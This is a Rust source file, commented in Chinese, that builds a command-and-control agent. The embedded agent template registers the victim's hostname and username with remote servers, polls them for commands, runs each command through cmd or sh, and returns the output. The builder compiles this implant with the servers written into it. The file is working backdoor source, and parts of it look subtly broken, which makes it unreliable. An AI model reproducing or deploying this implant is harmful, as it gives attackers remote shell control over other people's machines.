//! C2 Agent 二进制生成器
//!
//! 接收 C2 服务器地址列表，生成一个独立的 agent 二进制。
//! Agent 连接到 C2 服务器，上报系统信息，轮询命令并执行。

use std::fs;
use std::path::PathBuf;
use std::process::Command;

/// Agent 源文件模板 — 编译后是一个独立的 C2 客户端。
const AGENT_SOURCE: &str = r###"// C2 Agent — 自动生成，请勿手动编辑
// 编译: rustc -C opt-level=3 -C target-feature=+crt-static --edition 2021 <this_file> -o c2-agent

use std::process::{Command, Stdio};
use std::time::Duration;
use std::io::Read;

const SERVERS: &[&str] = &[SERVERS_PLACEHOLDER];
const POLL_INTERVAL_SECS: u64 = 30;

#[derive(serde::Serialize, serde::Deserialize)]
struct SystemInfo {
    hostname: String,
    os: String,
    username: String,
    pid: u32,
}

#[derive(serde::Serialize, serde::Deserialize)]
struct Ping {
    client_id: String,
    info: SystemInfo,
}

#[derive(serde::Deserialize)]
struct Task {
    id: Option<String>,
    #[serde(rename = "type")]
    task_type: Option<String>,
    command: Option<String>,
}

#[derive(serde::Serialize)]
struct TaskResult {
    id: String,
    success: bool,
    output: String,
}

fn system_info() -> SystemInfo {
    let hostname = std::env::var("HOSTNAME")
        .or_else(|_| std::env::var("COMPUTERNAME"))
        .unwrap_or_else(|_| "unknown".into());
    let os = if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else {
        "other"
    }.to_string();
    let username = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());
    SystemInfo { hostname, os, username, pid: std::process::id() }
}

fn exec(cmd: &str) -> (bool, String) {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", cmd]).output()
    } else {
        Command::new("sh").args(["-c", cmd]).output()
    };
    match output {
        Ok(o) => {
            let mut text = String::new();
            text.push_str(&String::from_utf8_lossy(&o.stdout));
            if !o.stderr.is_empty() {
                if !text.is_empty() { text.push_str("\n--- stderr ---\n"); }
                text.push_str(&String::from_utf8_lossy(&o.stderr));
            }
            (o.status.success(), text)
        }
        Err(e) => (false, format!("Failed to execute: {e}")),
    }
}

fn try_connect(server: &str) -> Option<reqwest::blocking::Client> {
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(10))
        .build().ok()?;
    let info = system_info();
    let ping = Ping {
        client_id: format!("{}@{}", info.username, info.hostname),
        info,
    };
    let url = format!("{}/agent/register", server.trim_end_matches('/'));
    client.post(&url).json(&ping).send().ok()?;
    Some(client)
}

fn poll_task(client: &reqwest::blocking::Client, server: &str, client_id: &str) -> Option<Task> {
    let url = format!("{}/agent/task?client_id={}", server.trim_end_matches('/'), client_id);
    let resp = client.get(&url).send().ok()?;
    let task: Task = resp.json().ok()?;
    task.id.as_ref()?; // ensure task.id is Some
    Some(task)
}

fn submit_result(client: &reqwest::blocking::Client, server: &str, result: &TaskResult) {
    let url = format!("{}/agent/result", server.trim_end_matches('/'));
    let _ = client.post(&url).json(result).send();
}

fn main() {
    let servers = SERVERS;
    let info = system_info();
    let client_id = format!("{}@{}", info.username, info.hostname);
    println!("[c2-agent] Starting. Client ID: {client_id}");
    println!("[c2-agent] Servers: {}", servers.join(", "));

    // Try each server until one works
    let client = loop {
        for srv in servers {
            if let Some(c) = try_connect(srv) {
                println!("[c2-agent] Connected to {srv}");
                break c;
            }
        }
        println!("[c2-agent] No server reachable, retrying in 60s...");
        std::thread::sleep(Duration::from_secs(60));
    };

    // Main loop: poll for tasks
    loop {
        if let Some(task) = poll_task(&client, servers[0], &client_id) {
            let cmd = task.command.unwrap_or_default();
            println!("[c2-agent] Executing: {cmd}");
            let (success, output) = exec(&cmd);
            let result = TaskResult {
                id: task.id.unwrap_or_default(),
                success,
                output,
            };
            submit_result(&client, servers[0], &result);
        }
        std::thread::sleep(Duration::from_secs(POLL_INTERVAL_SECS));
    }
}
"###;

/// Generate a C2 agent binary for the given server addresses.
pub fn build_agent(servers: &[String]) -> anyhow::Result<PathBuf> {
    let out_dir = PathBuf::from("./target/c2-agent");
    fs::create_dir_all(&out_dir)?;

    // Embed server addresses into the source
    let server_list: Vec<String> = servers.iter()
        .map(|s| format!("\"{}\"", s))
        .collect();
    let source = AGENT_SOURCE.replace("SERVERS_PLACEHOLDER", &server_list.join(", "));

    let source_path = out_dir.join("c2-agent.rs");
    fs::write(&source_path, &source)?;

    // Check if reqwest is available
    let has_reqwest = Command::new("cargo")
        .arg("search")
        .arg("reqwest")
        .arg("--limit")
        .arg("1")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);

    if has_reqwest {
        // Create a minimal Cargo project for the agent
        let cargo_toml = format!(r##"[package]
name = "c2-agent"
version = "0.1.0"
edition = "2021"

[dependencies]
serde = {{ version = "1", features = ["derive"] }}
serde_json = "1"
reqwest = {{ version = "0.12", features = ["blocking", "json"] }}
"##);
        fs::write(out_dir.join("Cargo.toml"), &cargo_toml)?;

        println!("Compiling C2 agent...");
        let status = Command::new("cargo")
            .args(["build", "--release", "--manifest-path", out_dir.join("Cargo.toml").to_str().unwrap()])
            .status()?;

        if status.success() {
            let binary = out_dir.join("target/release/c2-agent");
            if binary.exists() {
                println!("✔ C2 agent built: {}", binary.display());
                return Ok(binary);
            }
        }
        anyhow::bail!("Cargo build failed");
    } else {
        // Fallback: write the source and tell the user how to compile
        println!("✔ C2 agent source written to: {}", source_path.display());
        println!("  Compile with:");
        println!("    rustc -C opt-level=3 --edition 2021 {} -o c2-agent", source_path.display());
        println!("  Or copy the source to a machine with cargo and run:");
        println!("    cd {} && cargo build --release", out_dir.display());
        Ok(source_path)
    }
}